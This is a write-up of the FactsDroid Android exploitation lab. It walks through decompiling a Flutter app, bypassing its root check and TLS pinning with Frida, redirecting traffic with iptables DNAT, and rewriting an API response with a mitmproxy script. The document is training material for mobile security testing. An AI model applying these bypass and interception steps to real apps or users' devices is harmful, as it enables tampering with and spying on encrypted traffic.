# 8kSec — FactsDroid Lab Walkthrough

> Step-by-step solution guide for the **FactsDroid** challenge from the
> [8kSec Android Application Exploitation course](https://academy.8ksec.io/course/android-application-exploitation-challenges).

---

## Overview

FactsDroid is a Flutter application that fetches random facts from
`https://uselessfacts.jsph.pl/api/v2/facts/random`. The goal of the lab is to
intercept the API response and replace the fact `text` field with a custom
value — which requires bypassing the app's root check and Flutter's own TLS
validation along the way.

## Prerequisites

| Tool | Purpose |
|------|---------|
| Rooted Android device or emulator + `adb` | Running the target app |
| `jadx` | Java/Kotlin decompilation |
| `apktool` | Resource/asset extraction |
| [blutter](https://github.com/worawit/blutter) | Reverse-engineering Flutter `libapp.so` |
| Frida (server on device, client on host) | Runtime instrumentation |
| [NVISO disable-flutter-tls-verification](https://github.com/NVISOsecurity/disable-flutter-tls-verification) | Bypassing Flutter TLS pinning |
| `mitmproxy` | Traffic interception and response rewriting |

---

## Phase 1 — Install and Explore the App

```bash
adb install -r FactsDroid.apk
```

Open the app and press **Random Fact**. You should see:

> `Failed to fetch fact. API might be down`

This failure is what we will diagnose and fix through the lab.

---

## Phase 2 — Static Analysis

### 2.1 Decompile with JADX

Open the APK in JADX and inspect `MainActivity`. You will find a **root
check** exposed over a method channel:

```java
public final class MainActivity extends AbstractActivityC0004e {
    public final String f503f = "com.eightksec.factsdroid/root_check";
}
```

The channel handles a method named `isDeviceRooted`. If your device gets
detected, bypass it with a simple Frida script that forces the return value
to `false`.

### 2.2 Extract resources with apktool

```bash
apktool d FactsDroid.apk
```

A bundled certificate reveals the backend the app was designed to talk to:

```
FactsDroid/assets/flutter_assets/assets/certs/
└── uselessfacts_jsph_pl.crt
```

This hints at the API: `https://uselessfacts.jsph.pl/api/v2/facts/random`

### 2.3 Analyze libapp.so with blutter

Check your device architecture first:

```bash
adb shell getprop ro.product.cpu.abi
```

> **Note:** run blutter against the **arm64-v8a** libraries even if your
> device/emulator is `x86_64` — blutter works best with ARM64 snapshots.

```bash
python3 blutter.py FactsDroid/lib/arm64-v8a out_factsdroid_arm64-v8a
```

Search the output for the API host:

```bash
grep -Rni "useless" out_factsdroid_arm64-v8a
```

Key findings in `pp.txt`:

```
[pp+0xb458] String: "uselessfacts.jsph.pl"
[pp+0xb460] String: "/api/v2/facts/random"
[pp+0xb480] String: "ThisIsAVeryInsecureHardcodedKey!"   ← hardcoded AES-CBC key
```

We have now confirmed the endpoint and discovered an insecurely hardcoded
encryption key.

---

## Phase 3 — Bypass Flutter TLS Verification

Flutter does **not** use the system certificate store; it performs its own
X.509 validation inside BoringSSL. The NVISO Frida script locates
`ssl_verify_peer_cert` in `libflutter.so` via byte-pattern matching and
patches it to always return `0` (verified) — no APK modification or user CA
installation required.

```bash
git clone https://github.com/NVISOsecurity/disable-flutter-tls-verification
frida -U "FactsDroid" -l disable-flutter-tls.js
```

Expected output:

```
Attaching...
[+] Pattern version: May 19 2025
[+] Arch: x64
[+] Flutter library located
[+] ssl_verify_peer_cert found at offset: 0x7c4c99
[+] ssl_verify_peer_cert has been patched
```

Press **Random Fact** again — it should now work. The TLS bypass is
confirmed. Keep this Frida session running for the next phase.

---

## Phase 4 — Intercept and Rewrite Traffic

### Why not Burp's system proxy?

Dart's `HttpClient` (used by Flutter) **ignores the system proxy settings**.
Instead of relying on a proxy configuration, we redirect traffic at the
network layer with `iptables` DNAT rules.

### 4.1 Redirect device traffic to your host

In a root ADB shell on the device:

```bash
iptables -t nat -I OUTPUT -p tcp --dport 443 -j DNAT --to $IP:8081
iptables -t nat -I OUTPUT -p tcp --dport 80  -j DNAT --to $IP:8081
```

- `OUTPUT` — matches traffic leaving the device.
- `DNAT` — rewrites the destination to your host.
- `$IP` — your host machine's IP. On the standard Android emulator, use
  `10.0.2.2` to reach the host loopback.

### 4.2 Write the mitmproxy rewrite script

Save as `facts_replace.py`:

```python
from mitmproxy import http
import json

def response(flow: http.HTTPFlow):
    if "/facts/random" in flow.request.path:
        data = flow.response.json()
        data["text"] = "YOUR_NAME has solved FactsDroid"
        flow.response.text = json.dumps(data)
```

### 4.3 Run mitmproxy

> **Important:**
> - Disable any proxy configured on the device, and close Burp Suite.
> - The NVISO Frida script **must still be running** in the background.

```bash
pip3 install mitmproxy "bcrypt<4" "passlib>=1.7.4"
mitmproxy -s facts_replace.py -p 8081
```

### 4.4 Solve

Press **Random Fact** in the app. mitmproxy intercepts the JSON response and
replaces the `text` field with your custom fact — the app displays it:

```json
{
  "id": "e5255a3e28b8b10516c8188aafc3bdd2",
  "text": "YOUR_NAME has solved FactsDroid",
  "source": "djtech.net",
  "language": "en"
}
```

**Bonus:** rate your custom fact **4 stars or more** — the app remembers it.

---

## Phase 5 — Cleanup

Remove the DNAT rules when finished:

```bash
iptables -t nat -F
```

---

## Quick Reference — Attack Chain

```
Install APK
   │
   ├─► JADX ......... root check via "root_check" method channel → Frida bypass
   ├─► apktool ...... bundled cert reveals uselessfacts.jsph.pl
   ├─► blutter ...... confirms endpoint + hardcoded AES-CBC key
   │
   ├─► NVISO Frida script ... patches ssl_verify_peer_cert (Flutter TLS bypass)
   │
   ├─► iptables DNAT ........ routes device traffic to mitmproxy (port 8081)
   └─► mitmproxy ............ rewrites JSON "text" field → challenge solved
```

---

## Proof

![FactsDroid challenge solved](screenshots/solution_factsdroid.png)

The mitmproxy session log captured during the solve is available in
[artifacts/mitm_proof.txt](artifacts/mitm_proof.txt).
